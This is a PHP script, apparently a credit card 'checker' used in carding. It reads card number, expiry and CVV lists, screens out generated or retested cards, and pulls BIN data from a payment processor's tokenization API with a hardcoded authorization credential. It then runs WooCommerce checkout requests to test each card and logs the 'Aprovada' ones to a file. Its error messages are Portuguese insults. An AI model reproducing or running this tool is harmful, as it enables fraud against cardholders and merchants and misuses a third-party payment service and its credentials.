
<?php

session_start();
error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Sao_Paulo');

if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$time = time();

    
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


$ip = $_SERVER['REMOTE_ADDR'];


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("<br>Error -> Vai Se Fuder!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 )) {

die("<br>Error -> Vai tacar gerada no cu da sua mae! ");


}

$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("<br>Error ->Vai se foder randola!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ASDHASHDHASDhdies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ASDAUSDhuJASDllives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("<br>Error -> CC da época das caverna KKKKKKKKK!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

          die("<br>Error ->Tacou 000 né? Seu ip foi bloqueado!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("<br>Error -> Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor");


}

function getStr($string,$start,$end){
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure2-vault.hipay-tpp.com/rest/v2/token/create.json");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Basic OTQ2NzkxMTguc2VjdXJlLWdhdGV3YXkuaGlwYXktdHBwLmNvbTpMaXZlX2ZLd2x1Rk9uZmpRQTVjdWZrdFlZUXRTbQ==',
'Content-Type: application/x-www-form-urlencoded',
'Host: secure2-vault.hipay-tpp.com',
'Origin: https://secure-gateway.hipay-tpp.com',
'Referer: https://secure-gateway.hipay-tpp.com/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card_number='.$cc.'&card_holder=Ivo+kisner+junior&card_expiry_month=12&card_expiry_year=2024&cvc=000&generate_request_id=0&multi_use=1');
$pay = curl_exec($ch);
$hal = strtolower($pay);
$json = json_decode($hal, true);
$token = $json["token"];
$banco = $json["issuer"];
$pais = $json["country"];
$tipo = $json["card_type"];
$nivel = $json["card_category"];
$bandeira = $json["brand"];

$bin_result = "$bandeira $banco $tipo $nivel $pais ";

 switch (substr($cc, 0, 1)) {
case '4':
$typecard2 = 'visa';
break;
case '5':
$typecard2 = 'mastercard';
break;
case '2':
$typecard2 = 'mastercard';
break;
case '6':
$typecard2 = 'elo';
break;
case '3':
$typecard2 = 'amex';
break;
} 

$bin_result = "$bandeira $banco $level $tipo $pais";

$cookie = getcwd().'/'.rand(000000, 999999).'.txt';
$id = session_id();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(''));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$addcart = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(''));
$pxnonce = curl_exec($ch);

$randd = rand(100000, 1);
$email = "deminiosnamente".$randd."%40gmail.com";
$nonce = getStr($pxnonce,'name="woocommerce-process-checkout-nonce" value="','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(''));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$checkout = curl_exec($ch);
$retorno = getStr($checkout, '','');

if(stripos($checkout, '')){
  echo '<b><span class="badge badge-success">Aprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin_result.' ➜ <span class="badge badge-primary">00 – Transacao capturada com sucesso</span> ➜ ' . (time() - $time) .  ' Seg ➜ { Haika#1533 }</b> <br>';
      $file = fopen("ASDAUSDhuJASDllives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");
}
else{
  echo'<br><b><span class="badge badge-danger badge-glow">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin_result.' ➜ <span class="badge badge-primary">Retorno: { '.$retorno.' } </span> ➜ { Haika#1533 }</b>';
      $file = fopen("ASDHASHDHASDhdies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");
}

?>